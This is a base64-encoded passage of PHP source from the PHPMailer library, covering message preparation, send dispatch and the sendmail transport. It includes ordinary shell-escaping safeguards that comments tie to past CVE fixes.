H0KCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBQcmVwYXJlIGEgbWVzc2FnZSBmb3Igc2VuZGluZy4KICAgICAqCiAgICAgKiBAdGhyb3dzIEV4Y2VwdGlvbgogICAgICoKICAgICAqIEByZXR1cm4gYm9vbAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gcHJlU2VuZCgpCiAgICB7CiAgICAgICAgaWYgKAogICAgICAgICAgICAnc210cCcgPT09ICR0aGlzLT5NYWlsZXIKICAgICAgICAgICAgfHwgKCdtYWlsJyA9PT0gJHRoaXMtPk1haWxlciAmJiAoXFBIUF9WRVJTSU9OX0lEID49IDgwMDAwIHx8IHN0cmlwb3MoUEhQX09TLCAnV0lOJykgPT09IDApKQogICAgICAgICkgewogICAgICAgICAgICAvL1NNVFAgbWFuZGF0ZXMgUkZDLWNvbXBsaWFudCBsaW5lIGVuZGluZ3MKICAgICAgICAgICAgLy9hbmQgaXQncyBhbHNvIHVzZWQgd2l0aCBtYWlsKCkgb24gV2luZG93cwogICAgICAgICAgICBzdGF0aWM6OnNldExFKHNlbGY6OkNSTEYpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIC8vTWFpbnRhaW4gYmFja3dhcmQgY29tcGF0aWJpbGl0eSB3aXRoIGxlZ2FjeSBMaW51eCBjb21tYW5kIGxpbmUgbWFpbGVycwogICAgICAgICAgICBzdGF0aWM6OnNldExFKFBIUF9FT0wpOwogICAgICAgIH0KICAgICAgICAvL0NoZWNrIGZvciBidWdneSBQSFAgdmVyc2lvbnMgdGhhdCBhZGQgYSBoZWFkZXIgd2l0aCBhbiBpbmNvcnJlY3QgbGluZSBicmVhawogICAgICAgIGlmICgKICAgICAgICAgICAgJ21haWwnID09PSAkdGhpcy0+TWFpbGVyCiAgICAgICAgICAgICYmICgoXFBIUF9WRVJTSU9OX0lEID49IDcwMDAwICYmIFxQSFBfVkVSU0lPTl9JRCA8IDcwMDE3KQogICAgICAgICAgICAgICAgfHwgKFxQSFBfVkVSU0lPTl9JRCA+PSA3MDEwMCAmJiBcUEhQX1ZFUlNJT05fSUQgPCA3MDEwMykpCiAgICAgICAgICAgICYmIGluaV9nZXQoJ21haWwuYWRkX3hfaGVhZGVyJykgPT09ICcxJwogICAgICAgICAgICAmJiBzdHJpcG9zKFBIUF9PUywgJ1dJTicpID09PSAwCiAgICAgICAgKSB7CiAgICAgICAgICAgIHRyaWdnZXJfZXJyb3IoJHRoaXMtPmxhbmcoJ2J1Z2d5X3BocCcpLCBFX1VTRVJfV0FSTklORyk7CiAgICAgICAgfQoKICAgICAgICB0cnkgewogICAgICAgICAgICAkdGhpcy0+ZXJyb3JfY291bnQgPSAwOyAvL1Jlc2V0IGVycm9ycwogICAgICAgICAgICAkdGhpcy0+bWFpbEhlYWRlciA9ICcnOwoKICAgICAgICAgICAgLy9UaGUgY29kZSBiZWxvdyB0cmllcyB0byBzdXBwb3J0IGZ1bGwgdXNlIG9mIFVuaWNvZGUsCiAgICAgICAgICAgIC8vd2hpbGUgcmVtYWluaW5nIGNvbXBhdGlibGUgd2l0aCBsZWdhY3kgU01UUCBzZXJ2ZXJzIHRvCiAgICAgICAgICAgIC8vdGhlIGdyZWF0ZXN0IGRlZ3JlZSBwb3NzaWJsZTogSWYgdGhlIG1lc3NhZ2UgdXNlcwogICAgICAgICAgICAvL1VuaWNvZGUgaW4gdGhlIGxvY2FsIHBhcnRzIG9mIGFueSBhZGRyZXNzZXMsIGl0IGlzIHNlbnQKICAgICAgICAgICAgLy91c2luZyBTTVRQVVRGOC4gSWYgbm90LCBpdCBpdCBzZW50IHVzaW5nCiAgICAgICAgICAgIC8vcHVueWNvZGUtZW5jb2RlZCBkb21haW5zIGFuZCBwbGFpbiBTTVRQLgogICAgICAgICAgICBpZiAoCiAgICAgICAgICAgICAgICBzdGF0aWM6OkNIQVJTRVRfVVRGOCA9PT0gc3RydG9sb3dlcigkdGhpcy0+Q2hhclNldCkgJiYKICAgICAgICAgICAgICAgICgkdGhpcy0+YW55QWRkcmVzc0hhc1VuaWNvZGVMb2NhbFBhcnQoJHRoaXMtPlJlY2lwaWVudHNRdWV1ZSkgfHwKICAgICAgICAgICAgICAgICAkdGhpcy0+YW55QWRkcmVzc0hhc1VuaWNvZGVMb2NhbFBhcnQoYXJyYXlfa2V5cygkdGhpcy0+YWxsX3JlY2lwaWVudHMpKSB8fAogICAgICAgICAgICAgICAgICR0aGlzLT5hbnlBZGRyZXNzSGFzVW5pY29kZUxvY2FsUGFydCgkdGhpcy0+UmVwbHlUb1F1ZXVlKSB8fAogICAgICAgICAgICAgICAgICR0aGlzLT5hZGRyZXNzSGFzVW5pY29kZUxvY2FsUGFydCgkdGhpcy0+RnJvbSkpCiAgICAgICAgICAgICkgewogICAgICAgICAgICAgICAgJHRoaXMtPlVzZVNNVFBVVEY4ID0gdHJ1ZTsKICAgICAgICAgICAgfQogICAgICAgICAgICAvL0RlcXVldWUgcmVjaXBpZW50IGFuZCBSZXBseS1UbyBhZGRyZXNzZXMgd2l0aCBJRE4KICAgICAgICAgICAgZm9yZWFjaCAoYXJyYXlfbWVyZ2UoJHRoaXMtPlJlY2lwaWVudHNRdWV1ZSwgJHRoaXMtPlJlcGx5VG9RdWV1ZSkgYXMgJHBhcmFtcykgewogICAgICAgICAgICAgICAgaWYgKCEkdGhpcy0+VXNlU01UUFVURjgpIHsKICAgICAgICAgICAgICAgICAgICAkcGFyYW1zWzFdID0gJHRoaXMtPnB1bnllbmNvZGVBZGRyZXNzKCRwYXJhbXNbMV0pOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2FsbF91c2VyX2Z1bmNfYXJyYXkoWyR0aGlzLCAnYWRkQW5BZGRyZXNzJ10sICRwYXJhbXMpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChjb3VudCgkdGhpcy0+dG8pICsgY291bnQoJHRoaXMtPmNjKSArIGNvdW50KCR0aGlzLT5iY2MpIDwgMSkgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigkdGhpcy0+bGFuZygncHJvdmlkZV9hZGRyZXNzJyksIHNlbGY6OlNUT1BfQ1JJVElDQUwpOwogICAgICAgICAgICB9CgogICAgICAgICAgICAvL1ZhbGlkYXRlIEZyb20sIFNlbmRlciwgYW5kIENvbmZpcm1SZWFkaW5nVG8gYWRkcmVzc2VzCiAgICAgICAgICAgIGZvcmVhY2ggKFsnRnJvbScsICdTZW5kZXInLCAnQ29uZmlybVJlYWRpbmdUbyddIGFzICRhZGRyZXNzX2tpbmQpIHsKICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+eyRhZGRyZXNzX2tpbmR9ID09PSBudWxsKSB7CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnskYWRkcmVzc19raW5kfSA9ICcnOwogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJHRoaXMtPnskYWRkcmVzc19raW5kfSA9IHRyaW0oJHRoaXMtPnskYWRkcmVzc19raW5kfSk7CiAgICAgICAgICAgICAgICBpZiAoZW1wdHkoJHRoaXMtPnskYWRkcmVzc19raW5kfSkpIHsKICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICR0aGlzLT57JGFkZHJlc3Nfa2luZH0gPSAkdGhpcy0+cHVueWVuY29kZUFkZHJlc3MoJHRoaXMtPnskYWRkcmVzc19raW5kfSk7CiAgICAgICAgICAgICAgICBpZiAoIXN0YXRpYzo6dmFsaWRhdGVBZGRyZXNzKCR0aGlzLT57JGFkZHJlc3Nfa2luZH0pKSB7CiAgICAgICAgICAgICAgICAgICAgJGVycm9yX21lc3NhZ2UgPSBzcHJpbnRmKAogICAgICAgICAgICAgICAgICAgICAgICAnJXMgKCVzKTogJXMnLAogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+bGFuZygnaW52YWxpZF9hZGRyZXNzJyksCiAgICAgICAgICAgICAgICAgICAgICAgICRhZGRyZXNzX2tpbmQsCiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT57JGFkZHJlc3Nfa2luZH0KICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICAvL1NldCB3aGV0aGVyIHRoZSBtZXNzYWdlIGlzIG11bHRpcGFydC9hbHRlcm5hdGl2ZQogICAgICAgICAgICBpZiAoJHRoaXMtPmFsdGVybmF0aXZlRXhpc3RzKCkpIHsKICAgICAgICAgICAgICAgICR0aGlzLT5Db250ZW50VHlwZSA9IHN0YXRpYzo6Q09OVEVOVF9UWVBFX01VTFRJUEFSVF9BTFRFUk5BVElWRTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJHRoaXMtPnNldE1lc3NhZ2VUeXBlKCk7CiAgICAgICAgICAgIC8vUmVmdXNlIHRvIHNlbmQgYW4gZW1wdHkgbWVzc2FnZSB1bmxlc3Mgd2UgYXJlIHNwZWNpZmljYWxseSBhbGxvd2luZyBpdAogICAgICAgICAgICBpZiAoISR0aGlzLT5BbGxvd0VtcHR5ICYmIGVtcHR5KCR0aGlzLT5Cb2R5KSkgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZW1wdHlfbWVzc2FnZScpLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgLy9UcmltIHN1YmplY3QgY29uc2lzdGVudGx5CiAgICAgICAgICAgICR0aGlzLT5TdWJqZWN0ID0gdHJpbSgkdGhpcy0+U3ViamVjdCk7CiAgICAgICAgICAgIC8vQ3JlYXRlIGJvZHkgYmVmb3JlIGhlYWRlcnMgaW4gY2FzZSBib2R5IG1ha2VzIGNoYW5nZXMgdG8gaGVhZGVycyAoZS5nLiBhbHRlcmluZyB0cmFuc2ZlciBlbmNvZGluZykKICAgICAgICAgICAgJHRoaXMtPk1JTUVIZWFkZXIgPSAnJzsKICAgICAgICAgICAgJHRoaXMtPk1JTUVCb2R5ID0gJHRoaXMtPmNyZWF0ZUJvZHkoKTsKICAgICAgICAgICAgLy9jcmVhdGVCb2R5IG1heSBoYXZlIGFkZGVkIHNvbWUgaGVhZGVycywgc28gcmV0YWluIHRoZW0KICAgICAgICAgICAgJHRlbXBoZWFkZXJzID0gJHRoaXMtPk1JTUVIZWFkZXI7CiAgICAgICAgICAgICR0aGlzLT5NSU1FSGVhZGVyID0gJHRoaXMtPmNyZWF0ZUhlYWRlcigpOwogICAgICAgICAgICAkdGhpcy0+TUlNRUhlYWRlciAuPSAkdGVtcGhlYWRlcnM7CgogICAgICAgICAgICAvL1RvIGNhcHR1cmUgdGhlIGNvbXBsZXRlIG1lc3NhZ2Ugd2hlbiB1c2luZyBtYWlsKCksIGNyZWF0ZQogICAgICAgICAgICAvL2FuIGV4dHJhIGhlYWRlciBsaXN0IHdoaWNoIGNyZWF0ZUhlYWRlcigpIGRvZXNuJ3QgZm9sZCBpbgogICAgICAgICAgICBpZiAoJ21haWwnID09PSAkdGhpcy0+TWFpbGVyKSB7CiAgICAgICAgICAgICAgICBpZiAoY291bnQoJHRoaXMtPnRvKSA+IDApIHsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+bWFpbEhlYWRlciAuPSAkdGhpcy0+YWRkckFwcGVuZCgnVG8nLCAkdGhpcy0+dG8pOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+bWFpbEhlYWRlciAuPSAkdGhpcy0+aGVhZGVyTGluZSgnVG8nLCAndW5kaXNjbG9zZWQtcmVjaXBpZW50czo7Jyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkdGhpcy0+bWFpbEhlYWRlciAuPSAkdGhpcy0+aGVhZGVyTGluZSgKICAgICAgICAgICAgICAgICAgICAnU3ViamVjdCcsCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmVuY29kZUhlYWRlcigkdGhpcy0+c2VjdXJlSGVhZGVyKCR0aGlzLT5TdWJqZWN0KSkKICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIC8vU2lnbiB3aXRoIERLSU0gaWYgZW5hYmxlZAogICAgICAgICAgICBpZiAoCiAgICAgICAgICAgICAgICAhZW1wdHkoJHRoaXMtPkRLSU1fZG9tYWluKQogICAgICAgICAgICAgICAgJiYgIWVtcHR5KCR0aGlzLT5ES0lNX3NlbGVjdG9yKQogICAgICAgICAgICAgICAgJiYgKCFlbXB0eSgkdGhpcy0+REtJTV9wcml2YXRlX3N0cmluZykKICAgICAgICAgICAgICAgICAgICB8fCAoIWVtcHR5KCR0aGlzLT5ES0lNX3ByaXZhdGUpCiAgICAgICAgICAgICAgICAgICAgICAgICYmIHN0YXRpYzo6aXNQZXJtaXR0ZWRQYXRoKCR0aGlzLT5ES0lNX3ByaXZhdGUpCiAgICAgICAgICAgICAgICAgICAgICAgICYmIGZpbGVfZXhpc3RzKCR0aGlzLT5ES0lNX3ByaXZhdGUpCiAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgKQogICAgICAgICAgICApIHsKICAgICAgICAgICAgICAgICRoZWFkZXJfZGtpbSA9ICR0aGlzLT5ES0lNX0FkZCgKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+TUlNRUhlYWRlciAuICR0aGlzLT5tYWlsSGVhZGVyLAogICAgICAgICAgICAgICAgICAgICR0aGlzLT5lbmNvZGVIZWFkZXIoJHRoaXMtPnNlY3VyZUhlYWRlcigkdGhpcy0+U3ViamVjdCkpLAogICAgICAgICAgICAgICAgICAgICR0aGlzLT5NSU1FQm9keQogICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICR0aGlzLT5NSU1FSGVhZGVyID0gc3RhdGljOjpzdHJpcFRyYWlsaW5nV1NQKCR0aGlzLT5NSU1FSGVhZGVyKSAuIHN0YXRpYzo6JExFIC4KICAgICAgICAgICAgICAgICAgICBzdGF0aWM6Om5vcm1hbGl6ZUJyZWFrcygkaGVhZGVyX2RraW0pIC4gc3RhdGljOjokTEU7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiAkZXhjKSB7CiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXhjLT5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsKICAgICAgICAgICAgICAgIHRocm93ICRleGM7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBBY3R1YWxseSBzZW5kIGEgbWVzc2FnZSB2aWEgdGhlIHNlbGVjdGVkIG1lY2hhbmlzbS4KICAgICAqCiAgICAgKiBAdGhyb3dzIEV4Y2VwdGlvbgogICAgICoKICAgICAqIEByZXR1cm4gYm9vbAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gcG9zdFNlbmQoKQogICAgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIC8vQ2hvb3NlIHRoZSBtYWlsZXIgYW5kIHNlbmQgdGhyb3VnaCBpdAogICAgICAgICAgICBzd2l0Y2ggKCR0aGlzLT5NYWlsZXIpIHsKICAgICAgICAgICAgICAgIGNhc2UgJ3NlbmRtYWlsJzoKICAgICAgICAgICAgICAgIGNhc2UgJ3FtYWlsJzoKICAgICAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPnNlbmRtYWlsU2VuZCgkdGhpcy0+TUlNRUhlYWRlciwgJHRoaXMtPk1JTUVCb2R5KTsKICAgICAgICAgICAgICAgIGNhc2UgJ3NtdHAnOgogICAgICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+c210cFNlbmQoJHRoaXMtPk1JTUVIZWFkZXIsICR0aGlzLT5NSU1FQm9keSk7CiAgICAgICAgICAgICAgICBjYXNlICdtYWlsJzoKICAgICAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPm1haWxTZW5kKCR0aGlzLT5NSU1FSGVhZGVyLCAkdGhpcy0+TUlNRUJvZHkpOwogICAgICAgICAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgICAgICAgICAkc2VuZE1ldGhvZCA9ICR0aGlzLT5NYWlsZXIgLiAnU2VuZCc7CiAgICAgICAgICAgICAgICAgICAgaWYgKG1ldGhvZF9leGlzdHMoJHRoaXMsICRzZW5kTWV0aG9kKSkgewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPnskc2VuZE1ldGhvZH0oJHRoaXMtPk1JTUVIZWFkZXIsICR0aGlzLT5NSU1FQm9keSk7CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPm1haWxTZW5kKCR0aGlzLT5NSU1FSGVhZGVyLCAkdGhpcy0+TUlNRUJvZHkpOwogICAgICAgICAgICB9CiAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uICRleGMpIHsKICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRleGMtPmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJGV4Yy0+Z2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgaWYgKCR0aGlzLT5NYWlsZXIgPT09ICdzbXRwJyAmJiAkdGhpcy0+U01UUEtlZXBBbGl2ZSA9PSB0cnVlICYmICR0aGlzLT5zbXRwLT5jb25uZWN0ZWQoKSkgewogICAgICAgICAgICAgICAgJHRoaXMtPnNtdHAtPnJlc2V0KCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7CiAgICAgICAgICAgICAgICB0aHJvdyAkZXhjOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgLyoqCiAgICAgKiBTZW5kIG1haWwgdXNpbmcgdGhlICRTZW5kbWFpbCBwcm9ncmFtLgogICAgICoKICAgICAqIEBzZWUgUEhQTWFpbGVyOjokU2VuZG1haWwKICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRoZWFkZXIgVGhlIG1lc3NhZ2UgaGVhZGVycwogICAgICogQHBhcmFtIHN0cmluZyAkYm9keSAgIFRoZSBtZXNzYWdlIGJvZHkKICAgICAqCiAgICAgKiBAdGhyb3dzIEV4Y2VwdGlvbgogICAgICoKICAgICAqIEByZXR1cm4gYm9vbAogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gc2VuZG1haWxTZW5kKCRoZWFkZXIsICRib2R5KQogICAgewogICAgICAgIGlmICgkdGhpcy0+TWFpbGVyID09PSAncW1haWwnKSB7CiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJ1NlbmRpbmcgd2l0aCBxbWFpbCcpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJ1NlbmRpbmcgd2l0aCBzZW5kbWFpbCcpOwogICAgICAgIH0KICAgICAgICAkaGVhZGVyID0gc3RhdGljOjpzdHJpcFRyYWlsaW5nV1NQKCRoZWFkZXIpIC4gc3RhdGljOjokTEUgLiBzdGF0aWM6OiRMRTsKICAgICAgICAvL1RoaXMgc2V0cyB0aGUgU01UUCBlbnZlbG9wZSBzZW5kZXIgd2hpY2ggZ2V0cyB0dXJuZWQgaW50byBhIHJldHVybi1wYXRoIGhlYWRlciBieSB0aGUgcmVjZWl2ZXIKICAgICAgICAvL0Egc3BhY2UgYWZ0ZXIgYC1mYCBpcyBvcHRpb25hbCwgYnV0IHRoZXJlIGlzIGEgbG9uZyBoaXN0b3J5IG9mIGl0cyBwcmVzZW5jZQogICAgICAgIC8vY2F1c2luZyBwcm9ibGVtcywgc28gd2UgZG9uJ3QgdXNlIG9uZQogICAgICAgIC8vRXhpbSBkb2NzOiBodHRwczovL3d3dy5leGltLm9yZy9leGltLWh0bWwtY3VycmVudC9kb2MvaHRtbC9zcGVjX2h0bWwvY2gtdGhlX2V4aW1fY29tbWFuZF9saW5lLmh0bWwKICAgICAgICAvL1NlbmRtYWlsIGRvY3M6IGh0dHBzOi8vd3d3LnNlbmRtYWlsLm9yZy9+Y2EvZW1haWwvbWFuL3NlbmRtYWlsLmh0bWwKICAgICAgICAvL0V4YW1wbGUgcHJvYmxlbTogaHR0cHM6Ly93d3cuZHJ1cGFsLm9yZy9ub2RlLzEwNTc5NTQKCiAgICAgICAgLy9QSFAgNS42IHdvcmthcm91bmQKICAgICAgICAkc2VuZG1haWxfZnJvbV92YWx1ZSA9IGluaV9nZXQoJ3NlbmRtYWlsX2Zyb20nKTsKICAgICAgICBpZiAoZW1wdHkoJHRoaXMtPlNlbmRlcikgJiYgIWVtcHR5KCRzZW5kbWFpbF9mcm9tX3ZhbHVlKSkgewogICAgICAgICAgICAvL1BIUCBjb25maWcgaGFzIGEgc2VuZGVyIGFkZHJlc3Mgd2UgY2FuIHVzZQogICAgICAgICAgICAkdGhpcy0+U2VuZGVyID0gaW5pX2dldCgnc2VuZG1haWxfZnJvbScpOwogICAgICAgIH0KICAgICAgICAvL0NWRS0yMDE2LTEwMDMzLCBDVkUtMjAxNi0xMDA0NTogRG9uJ3QgcGFzcyAtZiBpZiBjaGFyYWN0ZXJzIHdpbGwgYmUgZXNjYXBlZC4KICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5TZW5kZXIpICYmIHN0YXRpYzo6dmFsaWRhdGVBZGRyZXNzKCR0aGlzLT5TZW5kZXIpICYmIHNlbGY6OmlzU2hlbGxTYWZlKCR0aGlzLT5TZW5kZXIpKSB7CiAgICAgICAgICAgIGlmICgkdGhpcy0+TWFpbGVyID09PSAncW1haWwnKSB7CiAgICAgICAgICAgICAgICAkc2VuZG1haWxGbXQgPSAnJXMgLWYlcyc7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAkc2VuZG1haWxGbXQgPSAnJXMgLW9pIC1mJXMgLXQnOwogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgLy9hbGxvdyBzZW5kbWFpbCB0byBjaG9vc2UgYSBkZWZhdWx0IGVudmVsb3BlIHNlbmRlci4gSXQgbWF5CiAgICAgICAgICAgIC8vc2VlbSBwcmVmZXJhYmxlIHRvIGZvcmNlIGl0IHRvIHVzZSB0aGUgRnJvbSBoZWFkZXIgYXMgd2l0aAogICAgICAgICAgICAvL1NNVFAsIGJ1dCB0aGF0IGludHJvZHVjZXMgbmV3IHByb2JsZW1zIChzZWUKICAgICAgICAgICAgLy88aHR0cHM6Ly9naXRodWIuY29tL1BIUE1haWxlci9QSFBNYWlsZXIvaXNzdWVzLzIyOTg+KSwgYW5kCiAgICAgICAgICAgIC8vaXQgaGFzIGhpc3RvcmljYWxseSB3b3JrZWQgdGhpcyB3YXkuCiAgICAgICAgICAgICRzZW5kbWFpbEZtdCA9ICclcyAtb2kgLXQnOwogICAgICAgIH0KCiAgICAgICAgJHNlbmRtYWlsID0gc3ByaW50Zigkc2VuZG1haWxGbXQsIGVzY2FwZXNoZWxsY21kKCR0aGlzLT5TZW5kbWFpbCksICR0aGlzLT5TZW5kZXIpOwogICAgICAgICR0aGlzLT5lZGVidWcoJ1NlbmRtYWlsIHBhdGg6ICcgLiAkdGhpcy0+U2VuZG1haWwpOwogICAgICAgICR0aGlzLT5lZGVidWcoJ1NlbmRtYWlsIGNvbW1hbmQ6ICcgLiAkc2VuZG1haWwpOwogICAgICAgICR0aGlzLT5lZGVidWcoJ0VudmVsb3BlIHNlbmRlcjogJyAuICR0aGlzLT5TZW5kZXIpOwogICAgICAgICR0aGlzLT5lZGVidWcoIkhlYWRlcnM6IHskaGVhZGVyfSIpOwoKICAgICAgICBpZiAoJHRoaXMtPlNpbmdsZVRvKSB7CiAgICAgICAgICAgIGZvcmVhY2ggKCR0aGlzLT5TaW5nbGVUb0FycmF5IGFzICR0b0FkZHIpIHsKICAgICAgICAgICAgICAgICRtYWlsID0gQHBvcGVuKCRzZW5kbWFpbCwgJ3cnKTsKICAgICAgICAgICAgICAgIGlmICghJG1haWwpIHsKICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdleGVjdXRlJykgLiAkdGhpcy0+U2VuZG1haWwsIHNlbGY6OlNUT1BfQ1JJVElDQUwpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygiVG86IHskdG9BZGRyfSIpOwogICAgICAgICAgICAgICAgZndyaXRlKCRtYWlsLCAnVG86ICcgLiAkdG9BZGRyIC4gIlxuIik7CiAgICAgICAgICAgICAgICBmd3JpdGUoJG1haWwsICRoZWFkZXIpOwogICAgICAgICAgICAgICAgZndyaXRlKCRtYWlsLCAkYm9keSk7CiAgICAgICAgICAgICAgICAkcmVzdWx0ID0gcGNsb3NlKCRtYWlsKTsKICAgICAgICAgICAgICAgICRhZGRyaW5mbyA9IHN0YXRpYzo6cGFyc2VBZGRyZXNzZXMoJHRvQWRkciwgdHJ1ZSwgJHRoaXMtPkNoYXJTZXQpOwogICAgICAgICAgICAgICAgJHRoaXMtPmRvQ2FsbGJhY2soCiAgICAgICAgICAgICAgICAgICAgKCRyZXN1bHQgPT09IDApLAogICAgICAgICAgICAgICAgICAgIFtbJGFkZHJpbmZvWydhZGRyZXNzJ10sICRhZGRyaW5mb1snbmFtZSddXV0sCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmNjLAogICAgICAgICAgICAgICAgICAgICR0aGlzLT5iY2MsCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlN1YmplY3QsCiAgICAgICAgICAgICAgICAgICAgJGJvZHksCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPkZyb20sCiAgICAgICAgICAgICAgICAgICAgW10KICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCJSZXN1bHQ6ICIgLiAoJHJlc3VsdCA9PT0gMCA/ICd0cnVlJyA6ICdmYWxzZScpKTsKICAgICAgICAgICAgICAgIGlmICgwICE9PSAkcmVzdWx0KSB7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZXhlY3V0ZScpIC4gJHRoaXMtPlNlbmRtYWlsLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRtYWlsID0gQHBvcGVuKCRzZW5kbWFpbCwgJ3cnKTsKICAgICAgICAgICAgaWYgKCEkbWFpbCkgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZXhlY3V0ZScpIC4gJHRoaXMtPlNlbmRtYWlsLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBmd3JpdGUoJG1haWwsICRoZWFkZXIpOwogICAgICAgICAgICBmd3JpdGUoJG1haWwsICRib2R5KTsKICAgICAgICAgICAgJHJlc3VsdCA9IHBjbG9zZSgkbWFpbCk7CiAgICAgICAgICAgICR0aGlzLT5kb0NhbGxiYWNrKAogICAgICAgICAgICAgICAgKCRyZXN1bHQgPT09IDApLAogICAgICAgICAgICAgICAgJHRoaXMtPnRvLAogICAgICAgICAgICAgICAgJHRoaXMtPmNjLAogICAgICAgICAgICAgICAgJHRoaXMtPmJjYywKICAgICAgICAgICAgICAgICR0aGlzLT5TdWJqZWN0LAogICAgICAgICAgICAgICAgJGJvZHksCiAgICAgICAgICAgICAgICAkdGhpcy0+RnJvbSwKICAgICAgICAgICAgICAgIFtdCiAgICAgICAgICAgICk7CiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoIlJlc3VsdDogIiAuICgkcmVzdWx0ID09PSAwID8gJ3RydWUnIDogJ2ZhbHNlJykpOwogICAgICAgICAgICBpZiAoMCAhPT0gJHJlc3VsdCkgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZXhlY3V0ZScpIC4gJHRoaXMtPlNlbmRtYWlsLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgLyoqCiAgICAgKiBGaXggQ1ZFLTIwMTYtMTAwMzMgYW5kIENWRS0yMDE2LTEwMDQ1IGJ5IGRpc2FsbG93aW5nIHBvdGVudGlhbGx